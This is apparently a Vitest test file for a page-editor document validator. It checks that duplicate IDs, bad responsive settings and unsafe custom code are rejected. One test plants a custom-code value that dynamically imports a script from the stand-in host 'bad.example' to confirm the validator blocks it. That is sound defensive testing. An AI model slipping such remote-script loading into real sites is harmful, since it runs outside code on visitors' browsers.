import { describe, expect, it } from "vitest";
import type { EditorDocument } from "../src/editor/document";
import { validateEditorDocument } from "../src/editor/schema";

function fixtureDocument(): EditorDocument {
  return {
    version: 2,
    name: "Page produit",
    path: "/page-produit",
    kind: "product",
    theme: {
      background: "#fffaf2",
      surface: "#ffffff",
      ink: "#171713",
      muted: "#706e66",
      accent: "#d8ff45",
      display: "sans",
      radius: "soft",
    },
    pages: [
      {
        id: "page_main",
        name: "Page produit",
        slug: "page-produit",
        sections: [
          {
            id: "section_hero",
            type: "hero",
            name: "Hero",
            hidden: false,
            locked: false,
            settings: { title: "Une boutique qui convertit", enabled: true, columns: 2 },
            style: { paddingTop: 80, textAlign: "center" },
            responsive: { mobile: { paddingTop: 32 } },
            blocks: [
              { id: "block_cta", type: "button", settings: { label: "Découvrir", href: "#product" } },
            ],
          },
        ],
      },
    ],
    assets: [
      { id: "asset_hero", type: "image", url: "/assets/hero.webp", alt: "Produit" },
    ],
  };
}

describe("EditorDocument validation", () => {
  it("accepts a complete v2 document", () => {
    const result = validateEditorDocument(fixtureDocument());
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.value.version).toBe(2);
  });

  it("rejects duplicate section and block identifiers", () => {
    const input = fixtureDocument();
    input.pages[0].sections.push({ ...input.pages[0].sections[0] });
    input.pages[0].sections[0].blocks.push({ ...input.pages[0].sections[0].blocks[0] });

    const result = validateEditorDocument(input);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.errors).toContain("Duplicate section id: section_hero");
      expect(result.errors).toContain("Duplicate block id: block_cta");
    }
  });

  it("rejects custom code that loads a remote script", () => {
    const input = fixtureDocument();
    input.pages[0].sections[0] = {
      ...input.pages[0].sections[0],
      type: "customCode",
      settings: { html: "<div>Quiz</div>", css: ".quiz{}", js: "import('https://bad.example/app.js')" },
    };

    const result = validateEditorDocument(input);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.errors).toContain("Unsafe custom code in section: section_hero");
  });

  it("rejects malformed responsive values and unsupported setting objects", () => {
    const input = fixtureDocument() as unknown as Record<string, unknown>;
    const pages = input.pages as Array<{ sections: Array<Record<string, unknown>> }>;
    pages[0].sections[0].responsive = { television: { paddingTop: 10 } };
    pages[0].sections[0].settings = { product: { token: "secret" } };

    const result = validateEditorDocument(input);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.errors).toContain("Invalid responsive settings in section: section_hero");
      expect(result.errors).toContain("Invalid setting value at section_hero.product");
    }
  });
});
